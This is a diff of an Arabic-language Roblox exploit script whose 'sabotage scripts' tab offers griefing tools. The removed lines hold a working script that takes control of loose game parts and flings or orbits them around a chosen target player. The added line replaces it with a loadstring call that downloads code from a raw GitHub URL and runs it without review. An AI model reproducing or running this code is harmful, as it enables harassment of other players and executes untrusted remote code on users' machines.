@@ -87,11 +87,11 @@ LogService = game:GetService("LogService")
 	HUSAM1438 = true,
     IV_SEE = true,
 	Amine_city = true,
-K_31387 = true,
-haker_457230 = true,
-rengoku28306 = true,
-Hwrejplq = true,
-wkwjdnsnsndnxxnsnsn = true,
+    K_31387 = true,
+    haker_457230 = true,
+    rengoku28306 = true,
+    Hwrejplq = true,
+    wkwjdnsnsndnxxnsnsn = true,
 	Eiles917 = true,
 	mohmmad47n = true,
 	mr_Mustafa213 = true
@@ -900,129 +900,10 @@ TrollTab = Window:MakeTab({ Title = "سكربتات تخريب", Icon = "rbxasse
 
 TrollTab:AddSection({ "سكربتات الابواب" })
 TrollTab:AddButton({
-    Name = "V2(هالة ابواب💥)",
-    Description = "تدوير الابواب والسيارات حول اللاعب",
+    Name = "[V3]هالة ابواب 🌪️",
+    Description = "تدوير الاجزاء المتحركة",
     Callback = function()
-local gui = Instance.new("ScreenGui", game.CoreGui)
-local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 300, 0, 200)
-frame.Position = UDim2.new(0.4, 0, 0.3, 0)
-frame.BackgroundColor3 = Color3.fromRGB(110, 0, 0)
-frame.Active = true
-frame.Draggable = true
-
-local nameBox = Instance.new("TextBox", frame)
-nameBox.Size = UDim2.new(0, 280, 0, 30)
-nameBox.Position = UDim2.new(0, 10, 0, 10)
-nameBox.PlaceholderText = "اكتب اسم اللاعب"
-nameBox.TextScaled = true
-
-local radiusBox = Instance.new("TextBox", frame)
-radiusBox.Size = UDim2.new(0, 280, 0, 30)
-radiusBox.Position = UDim2.new(0, 10, 0, 50)
-radiusBox.PlaceholderText = "اكتب نصف القطر"
-radiusBox.Text = "10"
-radiusBox.TextScaled = true
-
-local toggleButton = Instance.new("TextButton", frame)
-toggleButton.Size = UDim2.new(0, 280, 0, 30)
-toggleButton.Position = UDim2.new(0, 10, 0, 90)
-toggleButton.Text = "Bring | مطفي"
-toggleButton.TextScaled = true
-
-local modeButton = Instance.new("TextButton", frame)
-modeButton.Size = UDim2.new(0, 280, 0, 30)
-modeButton.Position = UDim2.new(0, 10, 0, 130)
-modeButton.Text = "الوضع : تجميع"
-modeButton.TextScaled = true
-
-local parts, active, rotateMode, connection = {}, false, false, nil
-local targetPlayer, hrp
-
-local function getPlayer(name)
-	for _, p in ipairs(Players:GetPlayers()) do
-		if p.Name:lower():find(name:lower()) or p.DisplayName:lower():find(name:lower()) then
-			return p
-		end
-	end
-end
-
-local function forcePart(part)
-	if part:IsA("BasePart") and not part.Anchored and not part.Parent:FindFirstChildOfClass("Humanoid") and part.Name ~= "Handle" then
-		for _, c in ipairs(part:GetChildren()) do
-			if c:IsA("BodyMover") or c:IsA("AlignPosition") then
-				c:Destroy()
-			end
-		end
-		part.CanCollide = false
-		local att = Instance.new("Attachment", part)
-		local align = Instance.new("AlignPosition", part)
-		align.Attachment0 = att
-		align.RigidityEnabled = false
-		align.Mode = Enum.PositionAlignmentMode.OneAttachment
-		align.MaxForce = 1e9
-		align.Responsiveness = 200
-		table.insert(parts, {part=part, att=att, align=align})
-	end
-end
-
-local function startBring()
-	active = true
-	toggleButton.Text = "Bring | شغال"
-	for _, v in ipairs(Workspace:GetDescendants()) do forcePart(v) end
-	connection = Workspace.DescendantAdded:Connect(forcePart)
-end
-
-local function stopBring()
-	active = false
-	toggleButton.Text = "Bring | مطفي"
-	if connection then connection:Disconnect() end
-	for _, p in ipairs(parts) do
-		if p.part and p.part:IsDescendantOf(Workspace) then
-			p.part.CanCollide = true
-			p.att:Destroy()
-			p.align:Destroy()
-		end
-	end
-	parts = {}
-end
-
-toggleButton.MouseButton1Click:Connect(function()
-	targetPlayer = getPlayer(nameBox.Text)
-	if targetPlayer then
-		hrp = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-		if hrp then
-			if not active then
-				startBring()
-			else
-				stopBring()
-			end
-		end
-	end
-end)
-
-modeButton.MouseButton1Click:Connect(function()
-	rotateMode = not rotateMode
-	modeButton.Text = rotateMode and "الوضع : دوران" or "الوضع : تجميع"
-end)
-
-RunService.Heartbeat:Connect(function()
-	if active and hrp then
-		local radius = tonumber(radiusBox.Text) or 10
-		local timeNow = tick()
-		for i, data in ipairs(parts) do
-			local part, att, align = data.part, data.att, data.align
-			if rotateMode then
-				local angle = (2 * math.pi / #parts) * i + timeNow*1.5
-				local pos = hrp.Position + Vector3.new(math.cos(angle)*radius, 3, math.sin(angle)*radius)
-				align.Position = pos
-			else
-				align.Position = hrp.Position + Vector3.new(0, 3, 0)
-			end
-		end
-	end
-end)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/Tahakom73"))()
     end
 })
 
